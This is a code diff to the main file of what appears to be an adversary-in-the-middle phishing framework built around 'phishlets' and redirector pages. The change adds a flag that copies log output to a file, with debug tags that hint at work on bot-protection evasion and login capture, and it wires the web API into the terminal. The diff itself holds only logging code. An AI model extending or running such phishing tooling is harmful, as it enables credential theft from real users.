@@ -3,6 +3,7 @@ package main
 import (
 	"flag"
 	"fmt"
+	"io"
 	_log "log"
 	"net"
 	"os"
@@ -26,6 +27,7 @@ var phishlets_dir = flag.String("p", "", "Phishlets directory path")
 var redirectors_dir = flag.String("t", "", "HTML redirector pages directory path")
 var post_redirectors_dir = flag.String("u", "", "HTML post-redirector pages directory path")
 var debug_log = flag.Bool("debug", false, "Enable debug output")
+var log_file = flag.String("log", "", "Tee all log output to this file (useful for grepping debug tags like [kasada-dbg], [gdlogin], [fedleak])")
 var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
 var cfg_dir = flag.String("c", "", "Configuration directory path")
 var version_flag = flag.Bool("v", false, "Show version")
@@ -138,6 +140,16 @@ func main() {
 	log.DebugEnable(*debug_log)
 	if *debug_log {
 		log.Info("debug output enabled")
+	}
+	if *log_file != "" {
+		f, err := os.OpenFile(*log_file, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
+		if err != nil {
+			log.Fatal("failed to open log file: %v", err)
+			return
+		}
+		defer f.Close()
+		log.SetOutput(io.MultiWriter(log.GetOutput(), f))
+		log.Info("tee log output to: %s", *log_file)
 	}
 
 	phishlets_path := *phishlets_dir
@@ -303,7 +315,7 @@ func main() {
 	webApi := core.NewWebAPI(db, cfg, ns, hp)
 	webApi.Start(cfg.GetWebAdminPort())
 
-	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
+	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode, webApi)
 	if err != nil {
 		log.Fatal("%v", err)
 		return
